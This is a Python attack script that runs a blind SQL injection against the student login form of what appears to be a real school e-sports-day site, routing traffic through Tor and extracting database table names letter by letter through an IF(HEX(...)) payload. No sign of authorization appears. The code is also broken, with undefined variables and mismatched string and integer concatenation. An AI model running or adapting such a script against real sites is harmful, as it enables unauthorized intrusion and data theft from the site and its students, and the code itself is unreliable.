import time
import requests

url = "http://aos.ssc.edu.hk/aos/e-sportsday/student/index.php"


#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
alphabet = ["_","e","t","a","o","i","n","s","h","r","d","l","c","u","m","w","f","g","y","p","b","v","k","j","x","q","z"]
#DO NOT CHANGE THIS PART

table = 0
while True:
    char = 1
    while not isTableFinished:

        for letter in alphabet:
            injection = "a' OR IF(HEX("+letter+")=HEX((SELECT SUBSTRING(table_name,"+char+",1) AS ExtractString FROM information_schema.tables LIMIT 1 OFFSET "+i-1+")),1,'a'); -- "
            response = requests.post(
                url,
                cookies=cookies,
                data={
                'input_unique_id': injection,
                'input_pass': 'a',
                'btn_login': 'Submit',
                },
                verify=False,
                proxies=prox
            )
            time.sleep(0.7)
            #print("Response content:")
            #print(response.text)
            #print(response.text[40])
            if response.text[40]=='p':
                print(letter)
                char += 1
                break
        else:
            print("table done")
            isTableFinished = True
    #-->ADD DETECT ERROR MESSAGE HERE<--
    #break
print("DONE\ntable number:"+str(table+1))